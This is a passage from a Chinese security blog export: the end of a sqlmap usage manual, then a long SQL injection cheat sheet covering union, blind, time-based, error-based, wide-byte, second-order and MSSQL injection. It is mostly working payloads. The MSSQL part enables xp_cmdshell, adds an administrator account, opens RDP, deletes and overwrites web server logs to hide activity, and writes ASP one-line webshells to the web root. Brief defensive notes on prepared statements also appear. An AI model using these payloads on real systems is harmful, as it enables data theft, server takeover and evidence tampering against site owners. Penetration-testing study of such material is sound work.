DBMS absolute filepath to write to Operating system access: These options can be used to access the back-end database management system underlying operating system --os-cmd=OSCMD Execute an operating system command --os-shell Prompt for an interactive operating system shell --os-pwn Prompt for an OOB shell, Meterpreter or VNC --os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC --os-bof Stored procedure buffer overflow exploitation --priv-esc Database process user privilege escalation --msf-path=MSFPATH Local path where Metasploit Framework is installed --tmp-path=TMPPATH Remote absolute path of temporary files directory Windows registry access: These options can be used to access the back-end database management system Windows registry --reg-read Read a Windows registry key value --reg-add Write a Windows registry key value data --reg-del Delete a Windows registry key value --reg-key=REGKEY Windows registry key --reg-value=REGVAL Windows registry key value --reg-data=REGDATA Windows registry key value data --reg-type=REGTYPE Windows registry key value type General: These options can be used to set some general working parameters -s SESSIONFILE Load session from a stored (.sqlite) file -t TRAFFICFILE Log all HTTP traffic into a textual file --batch Never ask for user input, use the default behavior --binary-fields=.. Result fields having binary values (e.g. &quot;digest&quot;) --check-internet Check Internet connection before assessing the target --crawl=CRAWLDEPTH Crawl the website starting from the target URL --crawl-exclude=.. Regexp to exclude pages from crawling (e.g. &quot;logout&quot;) --csv-del=CSVDEL Delimiting character used in CSV output (default &quot;,&quot;) --charset=CHARSET Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;) --dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE) --encoding=ENCOD.. Character encoding used for data retrieval (e.g. GBK) --eta Display for each output the estimated time of arrival --flush-session Flush session files for current target --forms Parse and test forms on target URL --fresh-queries Ignore query results stored in session file --har=HARFILE Log all HTTP traffic into a HAR file --hex Use hex conversion during data retrieval --output-dir=OUT.. Custom output directory path --parse-errors Parse and display DBMS error messages from responses --preprocess=PRE.. Use given script(s) for preprocessing of response data --repair Redump entries having unknown character marker (?) --save=SAVECONFIG Save options to a configuration INI file --scope=SCOPE Regexp to filter targets from provided proxy log --test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW) --test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK) --update Update sqlmap Miscellaneous: -z MNEMONICS Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;) --alert=ALERT Run host OS command(s) when SQL injection is found --answers=ANSWERS Set predefined answers (e.g. &quot;quit=N,follow=N&quot;) --beep Beep on question and/or when SQL injection is found --cleanup Clean up the DBMS from sqlmap specific UDF and tables --dependencies Check for missing (optional) sqlmap dependencies --disable-coloring Disable console output coloring --gpage=GOOGLEPAGE Use Google dork results from specified page number --identify-waf Make a thorough testing for a WAF/IPS protection --list-tampers Display list of available tamper scripts --mobile Imitate smartphone through HTTP User-Agent header --offline Work in offline mode (only use session data) --purge Safely remove all content from sqlmap data directory --skip-waf Skip heuristic detection of WAF/IPS protection --smart Conduct thorough tests only if positive heuristic(s) --sqlmap-shell Prompt for an interactive sqlmap shell --tmp-dir=TMPDIR Local directory for storing temporary files --web-root=WEBROOT Web server document root directory (e.g. &quot;/var/www&quot;) --wizard Simple wizard interface for beginner users Output verbosity1-v 通过这个参数来设置输出文本的可见度。共有7个可见度等级，默认等级为1，在这个等级下，information,warning,error,critical messages and python tracebacks会被显示出来。 12345670、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页面。 想理解sqlmap在后台做了些什么，等级2比较合适；想看到payload构造，等级3是最好的选择，如果你需要向开发者反馈潜在漏洞，同样推荐等级3，配合-t来保存日志文件；想要进一步查找潜在的bug或意想不到的行为，推荐等级4或更高等级；使用-v可以代替-v 2，-vv代替-v 3，-vvv代替-v 4，以此类推。 Target直接连接数据库1-d 使用sqlmap连接一个数据库，需要下面2种格式的连接字符串。 DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME (MySQL, Oracle, Microsoft SQL Server, PostgreSQL, etc.) DBMS://DATABASE_FILEPATH (SQLite, Microsoft Access, Firebird, etc.) For example: 1$ python sqlmap.py -d &quot;mysql://admin:admin@192.168.21.17:3306/testdb&quot; -f --banner --dbs --users 指定目标URL12-u--url 使用sqlmap测试目标URL，需要下面格式的URL http(s)://targeturl[:port]/[...] For example: 1$ python sqlmap.py -u http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs --users 从Burp或WebScarab的代理日志中获取目标1-l 从Burp proxy和Web Scarab proxy的代理日志文件中解析出可能的攻击目标，参数后跟日志文件路径 从站点地图文件中获取目标1-x 为便于搜索引擎收录，许多网站专门为搜索引擎生成了xml格式的站点地图。Sqlmap可以直接解析xml格式的站点地图，从中提取攻击目标，对一个网站全方位无死角地进行注入检测。 For example: 1$ python sqlmap.py -x http://www.target.com/sitemap.xml 从文本文件中获取目标1-m 将多个目标URL写在一个文本文件中，sqlmap会按顺序扫描每个URL。 For example: 将待测URL写在urls.txt中，格式如下 123www.target1.com/vuln1.php?q=foobarwww.target2.com/vuln2.asp?id=1www.target3.com/vuln3/id/1* 运行sqlmap 1$ python sqlmap.py -m urls.txt 从文本文件中加载HTTP请求1-r 从文本文件中加载原始HTTP请求，这种方式可以让你跳过输入一些参数，如设置cookie，post数据等。可以使用BurpSuite抓包并保存HTTP请求文件 HTTP请求文件格式 12345POST /vuln.php HTTP/1.1Host: www.target.comUser-Agent: Mozilla/4.0id=1 sqlmap支持HTTPS，可以在命令后加上--force-ssl强制使用SSL连接到443/tcp端口。也可以在Host头后加上:443来使用HTTPS。 将Google搜索结果作为目标1-g sqlmap获取google搜索的前100个结果，对其中有GET参数的URL进行测试并询问是否测试每一个URL。 For example: 1$ python sqlmap.py -g &quot;inurl:\\&quot;.php?id=1\\&quot;&quot; 从配置文件中载入目标1-c 将攻击目标及各种参数写在配置文件中，sqlmap可以通过加载配置文件对目标进行测试。在sqlmap的安装根目录下有sqlmap.conf文件，这是配置文件的模板，可以根据需求写入参数。 RequestHTTP 请求方式1--method sqlmap会自动检测正确的HTTP请求方式。然而，在一些情况下，需要使用不会自动识别的特殊HTTP请求方式，例如PUT，这时就需要指定请求方式。 For example: 1--method=PUT HTTP POST数据1--data 默认情况下，sqlmap使用GET，但你可以通过提供POST数据将请求方式改为POST。这些数据会被当做SQL注入测试的参数。 For example: 1$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f --banner --dbs --users 指定参数分割符1--param-del 有些情况下，默认参数分割符(e.g. GET和POST中的&amp;)需要被指定为新的分割符来保证sqlmap可以正常差分并处理每个参数。 For example: 12$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=\\1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users HTTPCookie 1234--cookie--cookie-del--load-cookies--drop-set-cookie 使用这些参数的2中情况： 测试页面需要基于cookie的登录认证，并且你有这些数据 想要测试cookie注入(当--level设置为2或更高时，sqlmap会检测cookie注入) 两种情况均需要使用sqlmap发送cookie，可以使用下方步骤发送cookie 登录网页 从浏览器中获取cookie 将第二步获得cookie作为--cookie的值 注意，HTTP cookie中的值通常由;来分割，而不是&amp;。sqlmap可以从GET和POST参数中，分辨出cookie并将其作为独立参数。为了防止分割符不是;可以通过–-cookie-del来设置分割符。 在后续的连接中，若HTTP响应头仍有Set-Cookie，sqlmap会自动使用之前设置的cookie，并测试这些值。可以通过--drop-set-cookie参数使sqlmap忽略Set-Cookie。 反之，如果你提供了一个HTTPCookie头，并且使用了--cookie，而且目标URL每次都发送HTTP Set-Cookie，这时，sqlmap会询问你要为HTTP请求使用哪组cookie。 可以使用--load-cookies载入文件中包含的Netscape/wget格式的cookie。 参考[1] sqlmap_Usage [2] Sqlmap中文手册","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/categories/工具使用/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'SQL注入总结'","slug":"Sql-Injection","date":"2019-04-11T12:15:59.000Z","updated":"2019-07-07T11:48:24.607Z","comments":true,"path":"2019/04/11/Sql-Injection/","link":"","permalink":"https://chirec.github.io/2019/04/11/Sql-Injection/","excerpt":"1. SQL注入原理前端有一个参数用户可控服务器对该参数没有过滤或过滤不严谨本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 2. SQL注入危害读取数据库的数据修改或删除数据getshell往服务器读写文件","text":"1. SQL注入原理前端有一个参数用户可控服务器对该参数没有过滤或过滤不严谨本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 2. SQL注入危害读取数据库的数据修改或删除数据getshell往服务器读写文件 3. 显错注入3.1 常用函数3.1.1 显示信息12345678user() @@hostnameversion() @@versiondatabase() @@tmpdir@@datadir@@basedir 3.1.2 拼接字段123456concat() 拼接多个字符串concat(username,0x7e,password)group_concat() 拼接表头group_concat(username,password)concat_ws() 拼接字符串，第一个字符串为分割符concat_ws(0x7e,username,password) 3.1.3 截取字段12345mid() 适用于MySQLsubstring() 适用于MySQL SQLSERVERsubstr() 适用于Oracle MySQL SQLSERVERleft()right() 3.1.4 条件判断123if(判断的条件，条件为真返回值，条件为假返回值)select if(&quot;1=1&quot;,&apos;true&apos;,&apos;false&apos;);select if(ascii(substr(database(),1,1))&gt;92,&apos;true&apos;,&apos;false&apos;); 123case when 判断的条件 then 条件为真返回值 else 条件为假返回值 endselect case when 1=1 then &apos;true&apos; else &apos;false&apos; end;select case when ascii(substr(database(),1,1))&gt;92 then &apos;true&apos; else &apos;false&apos; end; 3.1.5 判断字段数1order by 3.2 数据库的注释12345#%23--+--&amp;nbsp--%20 3.3 union 联合查询联合查询的前后字段数要求相同 1select uname,password,gender from users union select 1,2,3; 3.4 系统数据库3.4.1 information_schemamysql版本5.0以上，系统自带。汇总所有数据库的库名、表名、字段名。 3.4.1.1 columns表 字段名 存放数据 table_schema 存放所有数据库的库名 table_name 存放所有表名 column_name 存放所有字段名 privileges 存放可操作语句 3.4.1.2 tables表 字段名 存放数据 table_schema 存放所有数据库的库名 table_name 存放所有表名 3.4.2 常用查询3.4.2.1 查询所有数据库的库名1select distinct table_schema from information_schema.columns; 3.4.2.2 查询数据库中某个数据库中的所有表名1select distinct table_name from information_schema.columns where table_schema=&apos;chessur&apos;; 3.4.2.3 查询数据库中某个数据库中某个表的所有字段名1select distinct column_name from information_schema.columns where table_schema=&apos;chessur&apos; and table_name=&apos;users&apos;; 3.5 手工注入流程3.5.1 Step 1 判断是否有注入判断从后台数据库中选取的列数，判断哪几列在前端显示 3.5.2 Step 2 收集数据库信息（用户名，版本，当前数据库名）123select version();select user();select database(); 3.5.3 Step 3 获取当前数据库下的所有表名1select group_concat(distinct table_name) from information_schema.columns where table_schema=database(); 3.5.4 Step 4 获取当前数据库下指定表中字段名1select group_concat(distinct table_name) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;; 3.5.5 Step 5 获取字段对应的数据1select group_concat(distinct password) from users; 3.5.6 Step 6 解密数据数据库中有些数据会加密存放，所以需要解密。 4. 盲注因为不能回显错误信息，所以盲注要一个字符一个字符的尝试，通过二分法可以节省很多时间。 4.1 常用函数4.1.1 显示字段长度1length() 4.1.2 显示ASCII12ascii()ord() 4.1.3 截取字段12345mid() 适用于MySQLsubstr() 适用于Oracle MySQL SQLSERVERsubstring() 适用于MySQL SQLSERVERleft()right() 4.1.4 等待函数1sleep() 1benchmark() 4.2 布尔盲注4.2.1 Step 1 探测注入点123?id=1&apos; ?id=1&apos; and 1=1 #?id=1&apos; and &apos;1&apos;=&apos;1 # 根据页面的显示效果判断是否有注入点 4.2.2 Step 2 收集数据信息收集当前用户名、当前数据库、当前数据库版本 1and substr((select version()),1,1)&gt;4 //判断数据库版本是否大于4 5.0以上的mysql数据库有information_schema数据库。 4.2.3 Step 3 查询当前数据库中的表名12and ord(substr((select group_concat(distinct table_name)from information_schema.columns where table_schema=database()),1,1))=33 //判断第一个字符and ord(substr((select group_concat(distinct table_name)from information_schema.columns where table_schema=database()),2,1))=33 //判断第二个字符 12345and length((select table_name from information_schema.columns where table_schema=database() limt 1,1)) //第一个表名长度and length((select table_name from information_schema.columns where table_schema=database() limt 1,1)) //第二个表名长度and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),1,1)) //第一个表的第一个字符and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),2,1)) //第一个表的第二个字符and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 1,1),1,1)) //第二个表的第一个字符 4.2.4 Step 4 获取指定表的字段名123and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),1,1))=33 //判断第一个字段的第一个字符and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),2,1))=33 //判断第一个字段的第二个字符and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 1,1),1,1))=33 //判断第二个字段的第一个字符 4.2.5 Step 5 获取字段数据123and ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33 //判断第一个数据的第一个字符and ascii(substr((select concat(username,password)from users limit 0,1),2,1))=33 //判断第一个数据的第二个字符and ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33 //判断第二个数据的第一个字符 4.3 延时注入无法通过布尔盲注来判断SQL语句是否执行成功时，可以尝试报错延时注入。延时注入也叫基于时间的盲注。判断依据：页面加载时间延时注入使用条件判断语句以及等待函数来判断SQL语句是否执行成功。 4.3.1 延时函数4.3.1.1 sleep()1sleep(5) //让数据库等待5秒，再返回结果 4.3.1.2 benchmark()1benchmark(500000000,md5(&apos;abc&apos;)) 4.3.1.3 Heavy Query有些时候，无法使用延时函数来进行延时注入。这种情况下，最好的选择是使用数据库需要执行很久的sql语句。 1SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C 上面这个语句，在我的数据库中执行了22.15秒 4.3.2 条件判断123if(判断的条件，条件为真返回值，条件为假返回值)select if(&quot;1=1&quot;,&apos;true&apos;,&apos;false&apos;);select if(ascii(substr(database(),1,1))&gt;92,&apos;true&apos;,&apos;false&apos;); 123case when 判断的条件 then 条件为真返回值 else 条件为假返回值 endselect case when 1=1 then &apos;true&apos; else &apos;false&apos; end;select case when ascii(substr(database(),1,1))&gt;92 then &apos;true&apos; else &apos;false&apos; end; 4.3.3 基本构造1?id=1&apos; and if(1=1,1,sleep(5)) # 4.3.4 注入流程4.3.4.1 Step 1 探测注入点123?id=1&apos; ?id=1&apos; and 1=1 #?id=1&apos; and &apos;1&apos;=&apos;1 # 4.3.4.2 Step 2 收集数据信息123?id=1 and if(substr(version(),1,1)&gt;4,1,sleep(5)) #?id=1 and if(ord(substr(database(),1,1))=33,1,sleep(5)) #?id=1 and if(ord(substr(database(),2,1))=33,1,sleep(5)) # 4.3.4.3 Step 3 查询当前数据库中的表名123?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 0,1),1,1))=33,1,sleep(5))?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 0,1),2,1))=33,1,sleep(5))?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 1,1),1,1))=33,1,sleep(5)) 4.3.4.4 Step 4 查询指定表的字段名123?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),1,1))=33,1,sleep(5))?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),2,1))=33,1,sleep(5))?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 1,1),1,1))=33,1,sleep(5)) 4.3.4.5 Step 5 获取字段数据123and if(ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33,1,sleep(5))and if(ascii(substr((select concat(username,password)from users limit 0,1),2,1))=33,1,sleep(5))and if(ascii(substr((select concat(username,password)from users limit 1,1),1,1))=33,1,sleep(5)) 4.4 DNSlog在盲注中的使用4.4.15. 报错注入5.1 extractvalue(参数1，参数2)从目标XML中返回查询的字符串，参数1是string格式，XML文档名，参数2是XPATH格式，要查询的字符串 1select extractvalue(1,concat(0x7e,(select user()),0x7e)) 5.2 updatexml(参数1，参数2，参数3)改变文档中符合条件的节点的值，参数1是XML文档，参数2是XPATH格式的字符串，参数3是string格式的替换查找符合条件的数据 1select updatexml(1,concat(0x7e,(select user()),0x7e),1) 前两个报错函数的长度有限制 32位 5.3 floor()必须和count() rand() group by一起使用才能报错 1select * from messages where ID=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) 5.3.1 原理报错原因是主键重复，这个主键是虚拟表的主键。再进行group by查询过程中，先建立一张虚拟表，一行一行地插入内容，rand()函数也会多次计算，由于floor(rand(0)*2)能产生的值只有0和1，所以在第三次查询的时候就必然产生重复，所以第三次查询时必会报错。 1.查询前默认会建立空虚拟表 2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕 3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)*2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕 4.查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。 5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。 From：【学习笔记】MYSQL的floor报错原理分析总结 5.4 GeometryCollection()1and GeometryCollection((select * from(select * from(select user ())a)b)) 5.5 NAME_CONST()1and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x) 只能用来暴版本信息 5.6 join12and (select * from(select * from mysql.user a join mysql.user b)c)and (select * from (select * from mysql.user as a join mysql.user as b) as c) 只能用来暴列名，在暴出第一个列名后，在b后加上using(columnname)可以暴出第二个列名，使用,分隔，多个列名 1and (select * from(select * from mysql.user a join mysql.user b using(Host,User,Password))c) 5.7 exp()1and exp(~(select * from (select user () ) a) ); 5.8 polygon()1and polygon (()select * from(select user ())a)b ); 5.9 multipoint()1and multipoint (()select * from(select user() )a)b ); 5.10 multlinestring ()1and multlinestring (()select * from(selectuser () )a)b ); 5.11 multpolygon ()1and multpolygon (()select * from(selectuser () )a)b ); 5.12 linestring ()1and linestring (()select * from(select user() )a)b ); 6. 伪静态注入6.1 伪静态网站页面展示时html一类的静态页面，但其实使用asp一类的动态脚本来处理的。 6.2 生成伪静态网站以PHP为例 6.2.1 开启Apache的mod_rewrite12/apache/conf/httpd.confLoadModule rewrite_module 6.2.2 让Apache支持.htacess12/apache/conf/httpd.confAllowOverride All 6.2.3 建立.htacess文件在文件中写入 12RewriteEngine onRewriteRule (.*)\\.html$ index.php?id=$1 RewriteRule 实质时正则表达式进行匹配，可以根据自己需求更改 6.3 分辨真/伪静态网站可以通过查看网页最后修改时间来判断在地址栏输入 1javascript:alert(document.lastModified) 如果得到的时间和现在时间一致，则为伪静态网站，反之是真静态网站。 6.4 手工注入6.4.1 判断注入点12?1&apos;/**/and/**/1=1/*.html ?1&apos;/**/and/**/1=2/*.html 6.4.2 Tips 伪静态的注入和URL的普通GET注入不太相同。普通url的get注入的%20,%23,+等都可以用；但是伪静态不行，会被直接传递到到url中，所以用/**/这个注释符号表示空格。From：伪静态注入的总结 7. 宽字节注入7.1 原理数据库中采用GBK编码，并对用户输入的数据进行转义GBK中汉字占用2个字节ASCII中汉字占用1个字节 7.2 常见转义函数1234addslaches()mysql_real_escape_string() //不会对%和_进行转义mysql_escape_string() //5.3及以后就废弃magic_quotes_gpc //魔术引号GPC模块 7.2.1 转义1234&apos; ---&gt; \\&apos;&quot; ---&gt; \\&quot;\\ ---&gt; \\\\NULL ---&gt; \\NULL 7.3 注入过程1234id=1%df&apos; id=1%df\\&apos; //&apos;转义为\\&apos;id=1%df%5c&apos; //\\的URL编码为%5cid=1運&apos; //%df%5c在数据库中因为GBK编码变为運，&apos;逃逸出来，形成注入点 7.4 手工注入和显错注入过程相同 7.5 PDO宽字节注入7.5.1 条件1.数据库使用GBK编码2.使用转义函数，如addslaches()3.PHP版本&lt;5.3.6 使用PDO连接数据库，没有参数过滤 7.5.2 防御7.5.2.1 使用mysqli_set_charset() 而不是 set namesmysqli_set_charset()和set names的区别查看深入理解SET NAMES和mysql(i)_set_charset的区别 7.5.2.2 使用mysql_real_escape_string()mysql_real_escape_string()与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面df和5c拼接为一个宽字节的问题，使用mysqli_set_charset进行指定字符集 7.5.2.3 正确使用占位符确保每一个传入参数都先使用占位符进行代替 7.5.2.4 使用预处理注意，即使mysql版本支持预处理，某些语句mysql无法支持prepare，那么pdo在处理时还是会使用模拟预处理。这样可能会存在注入的风险。具体可以查看这篇回答：are-pdo-prepared-statements-sufficient-to-prevent-sql-injection 8. 二次解码注入8.1 原理浏览器出去的数据会被进行URL编码，到达服务器之后，默认会被URL解码mysql_real_escape_string()等转义函数是在urldecode()之前，所以并不能过滤由于urldecode()产生的单引号。 8.2 过程123id=1%25%32%27id=1%27 //id=1&apos; //urldecode() 8.3 防御8.3.1 预处理使用PDO的prepare进行预编译处理数据库查询 8.3.2 过滤函数PHP常使用的过滤函数有addslashes()、mysql_escape_string()、msyql_real_string()、intval()函数等，在程序进行SQL语句运行之前使用。 8.3.3 魔术引号通常数据污染的方式有两种：一种是应用被动接收参数，类似于GET、POST等；另一种是主动获取参数，类似与读取远程桌面页面或者文件内容等。在PHP中魔术引号配置方法，magic_quotes_gpc负责对GET、POST、COOKIE的值进行过滤，magic_quotes_runtime对数据库或者文件中获取的数据进行过滤。 9. HTTP头部注入9.1 cookie注入post和get方式被过滤，只能通过cookie传递数据，刚好服务器没有过滤cookie数据，然后在cookie中添加测试的payload 1javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;25&quot;)) 9.2 XFF注入1python sqlmap.py -u &quot;&quot; --headers=&quot;x-forwarded-for:*&quot; -v --batch 10. 二次注入二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入 10.1 原理在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据 10.2 示例10.2.1 注册脏用户 10.2.2 退出重新登录 10.2.3 留言1,(select admin_pass from admin limit 0,1),1);# 10.2.4 二次注入结果 11. MSSQL注入11.1 注入过程11.1.1 Step 1：判断注入点和mysql数据库判断方式相同 1234and 1=1and 1=2/-0 11.1.2 Step 2：判断数据库类型1234select * from sysobjects?1 and exists(select * from sysobjects)and (select count(\\*) from sysobjects)&gt;0 mssqland (select count(\\*) from msysobjects)&gt;0 access 11.1.3 Step 3：注入点权限判断1234select IS_SRVROLEMEMBER(&apos;sysadmin&apos;);select IS_SRVROLEMEMBER(&apos;db_owner&apos;);select IS_SRVROLEMEMBER(&apos;public&apos;);//有public权限可以暴破表http://target.com?id=1 and 1=(select IS_SRVROLEMEMBER(&apos;sysadmin&apos;)) 11.1.4 Step 4：信息收集1234567891011数据库版本 select @@version http://target.com?id=1 and @@version&gt;0http://target.com?id=1 and 1=(select @@version)http://target.com?id=1 and user&gt;0查询当前数据库http://target.com?id=1 and 1=（select db_name()） http://target.com?id=1 and 1=(convert(int,db_name()))db_name(n)表示第几个数据库获取其他数据库SELECT top 1 Name FROM Master..SysDatabases where name not in (&apos;master&apos;,&apos;aspcms&apos;);select DB_NAME(1); 11.1.5 Step 5：获取当前数据库下的表12select top 1 name from aspcms.sys.all_objects where type=&apos;U&apos; AND is_ms_shipped=0select top 1 name from aspcms.sys.all_objects where type=&apos;U&apos; AND is_ms_shipped=0 and name not in (&apos;AspCms_Collect_Content&apos;) 11.1.6 Step 6：获取当前数据库下指定表的字段名123如：AspCms_Userselect top 1 COLUMN_NAME from aspcms.information_schema.columns where TABLE_NAME=&apos;AspCms_User&apos;select top 1 COLUMN_NAME from aspcms.information_schema.columns where TABLE_NAME=&apos;AspCms_User&apos; and COLUMN_NAME not in (&apos;UserID&apos;,&apos;GroupID&apos;,&apos;LanguageID&apos;,&apos;SceneID&apos;,&apos;LoginName&apos;,&apos;Password&apos;) 11.1.7 Step 7：获取字段内容1234select top 1 LoginName from AspCms_Userselect top 1 Password from AspCms_Userselect top 1 LoginName from AspCms_User where LoginName not in (&apos;admin&apos;)http://target.com?id=1 and 1=(select top 1 Password from AspCms_User) 上面的都是通过类型不匹配，系统强制转换来显示数据 11.2 利用MSSQL扩展存储注入攻击11.2.1 检测与恢复扩展存储判断xp_cmdshell扩展存储是否存在1and 1=(select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; AND name = &apos;xp_cmdshell&apos;) 判断xp_regread扩展存储过程是否存在1and 1=(select count(*) from master.dbo.sysbojects where name=&apos;xp_regread&apos;) 恢复12EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;;exec sp_dropextendedproc xp_cmdshell,&apos;xplog70.dll&apos; 11.2.2 sa权限下扩展存储攻击利用方法11.2.2.1.利用xp_cmdshell扩展执行任意命令11.2.2.1.1 开启xp_cmdshell的方法12sql server20055下开启xp_cmdshellEXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE; 11.2.2.1.2 查看C盘1234;drop table black;create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))--;insert into black exec master..xp_cmdshell &apos;dir c:\\&apos;and 1= (select top 1 mulu from black where id =1) 11.2.2.1.3 新建用户12;exec master..xp_cmdshell &apos;net user test test /add&apos;;exec master..xp_cmdshell &apos;net localgroup administrators test /add&apos; 11.2.2.1.4 添加和删除一个SA权限的用户test （需要SA权限）12exec master.dbo.sp_addlogin test,passwordexec master.dbo.sp_addsrvrolemember test,sysadmin 11.2.2.1.5 停掉或激活某个服务 （需要SA权限）12exec master..xp_servicecontrol &apos;stop&apos;,&apos;schedule&apos;exec master..xp_servicecontrol &apos;start&apos;,&apos;schedule&apos; 11.2.2.1.6 爆网站目录123create table labeng(lala nvarchar(255),id int)DECLARE @result varchar(255) EXEC master.dbo.xp_regread &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\\ControlSet001\\Services\\W3SVC\\Parameters\\Virtual Roots&apos;,&apos;/&apos;,@result output insert into labeng(lala) values(@result);and 1=(select top 1 lala from labeng)或者and 1=(select count(*) from labeng where lala&gt;1) 11.2.2.1.7 删除日志记录1;exec master.dbo.xp_cmdshell &apos;del c:\\winnt\\system32\\logfiles\\w3svc5\\ex070606.log&gt;c:\\temp.txt 11.2.2.1.8替换日志记录1;exec master.dbo.xp_cmdshell &apos;copy c:\\winnt\\system32\\logfiles\\w3svc5\\ex070404.log c:\\winnt\\system32\\logfiles\\w3svc5\\ex070606.log &gt;c:\\temp.txt&apos; 11.2.2.1.9 开启远程数据库1;select * from OPENROWSET(&apos;SQLOLEDB&apos;,&apos;server=servername;uid=sa;pwd=apachy_123&apos;,&apos;select * from table1&apos;) 11.2.2.1.10 开启远程数据库1;select * from OPENROWSET(&apos;SQLOLEDB&apos;,&apos;uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;&apos;,&apos;select * from table&apos;) 11.2.2.1.11 打开338912345;exev master..xp_cmdshell &apos;sc config termservice start=auto&apos;;exec master..xp_cmdshell &apos;net start termservice&apos;;exec master..xp_cmdshell &apos;reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /vfDenyTSConnection/t REG_DWORD/d 0x0 /f&apos; //允许外部连接;exec master..xp_cmdshell &apos;reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x50 /f&apos;//端口改为80 11.2.2.1.12 利用sp_makewebtask写入一句话木马1234;exec sp_makewebtask &apos;c:\\inetpub\\wwwroot\\x.asp&apos;,&apos;select&quot;%3c%25%65%76%61%6C%20%72%65%71%75%65%73%74%28%22%63%68%6F%70%70%65%72%22%29%25%3E&quot;&apos;--http://mssql.sql.com/aspx.aspx?id=1%20;exec%20sp_makewebtask%20%20%27c:\\inetpub\\wwwroot\\ms\\x1.asp%27,%27select%27%27&lt;%execute(request(&quot;cmd&quot;))%&gt;%27%27%27--修改管理员密码update admin set password=126326 where username=&apos;admin&apos;; 11.2.3 dbowner权限下的扩展攻击利用11.2.3.1.判断数据库用户权限1and 1=(select is_member(&apos;db_owner&apos;));-- 11.2.3.2.搜索web目录1234;create table temp(dir nvarchar(255),files varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));--;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree &apos;c:&apos;,1,1--and (select dir from temp where id=1)&gt;0//由于不能一次性获取所有目录文件和文件夹名，因此需要更改ID的值，依次列出文件和文件夹 11.2.3.3.写入一句话木马找到web目录后，就可以写入一句话木马了 123456;alter database ssdown5 set RECOVERY FULL;create table test(str image)--;backup log ssdown5 to disk=&apos;c:\\test&apos; with init--;insert into test(str) values(&apos;&lt;%excute(request(&quot;cmd&quot;))%&gt;&apos;)--;backup log ssdown5 to disk=&apos;c:\\inetpub\\wwwroot\\x.asp&apos;--;alter database ssdown5 set 